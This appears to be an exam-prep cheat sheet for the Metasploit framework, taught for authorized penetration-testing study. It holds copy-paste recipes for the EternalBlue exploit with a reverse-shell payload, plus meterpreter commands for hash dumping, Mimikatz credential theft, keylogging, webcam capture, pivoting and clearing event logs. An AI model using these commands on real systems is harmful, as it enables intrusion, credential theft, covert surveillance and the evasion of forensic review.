# metasploit — the exploitation framework

> **The exploitation workhorse.** If the question says "gain a shell", "exploit", or "get access to", you almost certainly want msfconsole. Expect 3–6 exam Qs to flow through here.

**Install check (Parrot — already installed):** `msfconsole -v`
**Start it:** `sudo msfconsole -q` (`-q` = no banner, faster)

---

## 🎯 Cheat-flow: "How do I exploit X?"

| You need to... | Run this | Why |
|---|---|---|
| Find a module by keyword | `search <keyword>` | e.g. `search ms17-010` |
| Load a module | `use <path or index>` | Enters module context |
| See required options | `show options` | RHOSTS, LHOST, etc. |
| See compatible payloads | `show payloads` | After `use` |
| Set target IP | `set RHOSTS <IP>` | Victim |
| Set your IP | `set LHOST <IP>` | Your Parrot (`tun0`/`eth0`) |
| Set callback port | `set LPORT 4444` | Your listener port |
| Pick payload | `set PAYLOAD <path>` | e.g. `windows/x64/meterpreter/reverse_tcp` |
| **Fire it** | `exploit` or `run` | `-j` = background job |
| List sessions | `sessions -l` | See active shells |
| Interact with session | `sessions -i <id>` | Drop into meterpreter |
| Background a session | `background` (in session) | Return to msfconsole |
| Import nmap results | `db_nmap -sV -p- <IP>` | Populates hosts/services |

---

## 🔑 Commands you must know cold

### Navigation
| Command | Meaning |
|---|---|
| `search <term>` | Search modules (name, CVE, platform) |
| `search type:exploit platform:windows ms17` | Filtered search |
| `use <module>` | Select module by path or search index |
| `use 0` | Use result #0 from last search |
| `info` | Full info on current module |
| `back` | Leave current module |
| `show options` | Required + optional settings |
| `show payloads` | List compatible payloads |
| `show targets` | List target OS/arch variants |
| `set <OPT> <value>` | Set a module option |
| `setg <OPT> <value>` | Set **globally** (survives across modules) |
| `unset <OPT>` | Clear an option |
| `check` | Check if target is vulnerable (not all modules support) |
| `exploit` / `run` | Launch |
| `exploit -j` | Run as background job |
| `exploit -z` | Don't interact immediately |

### Sessions
| Command | Meaning |
|---|---|
| `sessions -l` | List active sessions |
| `sessions -i <id>` | Interact with session |
| `sessions -k <id>` | Kill session |
| `sessions -K` | Kill all |
| `sessions -u <id>` | Upgrade shell → meterpreter |
| `background` / `CTRL+Z` | Background current session |

### Database / workspace
| Command | Meaning |
|---|---|
| `db_status` | Check DB connection |
| `workspace` | Show/create workspaces |
| `workspace -a exam` | New workspace |
| `db_nmap <args>` | Run nmap, auto-import |
| `hosts` | List discovered hosts |
| `services` | List discovered services |
| `creds` | List captured credentials |
| `loot` | Files looted from targets |

---

## 🧪 Meterpreter — commands you must know cold

Once you have a meterpreter session (`sessions -i <id>`):

### Host recon
| Command | What it does |
|---|---|
| `sysinfo` | OS, arch, hostname, domain |
| `getuid` | Current user |
| `getpid` | Current process ID |
| `ps` | Process list |
| `ipconfig` / `ifconfig` | Network interfaces |
| `route` | Routing table |
| `arp` | ARP cache |
| `netstat` | Connections |
| `pwd` / `cd` / `ls` | Filesystem nav |

### Privilege / credentials
| Command | What it does |
|---|---|
| `getsystem` | Attempt privesc to SYSTEM |
| `hashdump` | **Dump local SAM hashes** (needs SYSTEM) |
| `run post/windows/gather/hashdump` | Same via post module |
| `load kiwi` → `creds_all` | Mimikatz — plaintext creds |
| `run post/windows/gather/enum_logged_on_users` | Who's logged in |

### File transfer
| Command | What it does |
|---|---|
| `upload <local> <remote>` | Push a file to target |
| `download <remote> <local>` | Pull a file from target |
| `cat <file>` | Read a file |
| `edit <file>` | Edit in vi |
| `search -f *.txt` | Find files by pattern |

### Process / shell
| Command | What it does |
|---|---|
| `shell` | Drop to native cmd/sh |
| `execute -f cmd.exe -i -H` | Run process (interactive, hidden) |
| `migrate <pid>` | **Migrate to another process** (stability, stealth) |
| `ps -S explorer.exe` | Find a stable process to migrate into |
| `kill <pid>` | Kill process |

### Pivoting
| Command | What it does |
|---|---|
| `portfwd add -l 3389 -p 3389 -r <internal-IP>` | Local port forward |
| `portfwd list` | Show forwards |
| `run autoroute -s 10.10.20.0/24` | Route subnet through session |

### Misc
| Command | What it does |
|---|---|
| `screenshot` | Grab desktop screenshot |
| `keyscan_start` / `keyscan_dump` / `keyscan_stop` | Keylogger |
| `webcam_list` / `webcam_snap` | Webcam |
| `clearev` | Clear Windows event logs |
| `idletime` | How long user has been idle |

---

## 📋 Command recipes (copy-paste)

### The canonical MS17-010 EternalBlue flow
```bash
sudo msfconsole -q

msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 10.10.10.5
msf6 exploit(...) > set LHOST 10.10.14.2          # your tun0 / eth0
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check                          # confirm vuln
msf6 exploit(...) > exploit

meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell
```

### Multi-handler (catch a payload you generated with msfvenom)
```bash
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.2
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > exploit -j
```

### Import nmap scan into Metasploit DB
```bash
msf6 > db_nmap -sV -sC -p- 10.10.10.5
msf6 > hosts
msf6 > services
msf6 > services -p 445
```

### Set globals so you don't retype LHOST every module
```bash
msf6 > setg LHOST 10.10.14.2
msf6 > setg LPORT 4444
msf6 > save
```

### Resource script (batch of commands) — handy for exam repetition
```bash
# Save as handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.2
set LPORT 4444
set ExitOnSession false
exploit -j
```
Run it: `msfconsole -q -r handler.rc`

### Common post modules
```bash
run post/windows/gather/hashdump
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/credential_collector
run post/multi/recon/local_exploit_suggester
```

---

## ⚠️ Gotchas

- **LHOST is YOUR IP**, not the target. Check `ip a` for your tun0/eth0 address before setting.
- **Firewalled LPORT?** Try 4444, 443, 80, 8080. 443 usually gets through.
- **"Exploit completed, but no session was created"** → wrong PAYLOAD arch (x86 vs x64), wrong target index (`show targets`), or LHOST unreachable.
- **Meterpreter dies fast?** Migrate immediately: `ps` → `migrate <explorer.exe pid>`.
- **`hashdump` fails?** You're not SYSTEM. Run `getsystem` first or use `load kiwi`.
- **Can't find module by name?** Try `search cve:2017-0144` or `search name:eternalblue`.
- **Forgot to set a required opt?** `show options` — anything marked `yes` in Required column MUST be set.
- **Session dies when you exit a shell** → use `exploit -j` (background job) and `set ExitOnSession false`.
- **db_nmap gives DB error?** `msfdb init` from a regular shell, then restart msfconsole.

---

## 🔗 Related

- [msfvenom — payload generation](./msfvenom.md)
- [nmap](./nmap.md) (feeds `db_nmap`)
- [john](./john.md) (crack hashes from `hashdump`)
- [Exploitation playbook](../playbooks/exploitation-playbook.md)
- [System hacking question bank](../questions/by-domain/05-system-hacking.md)
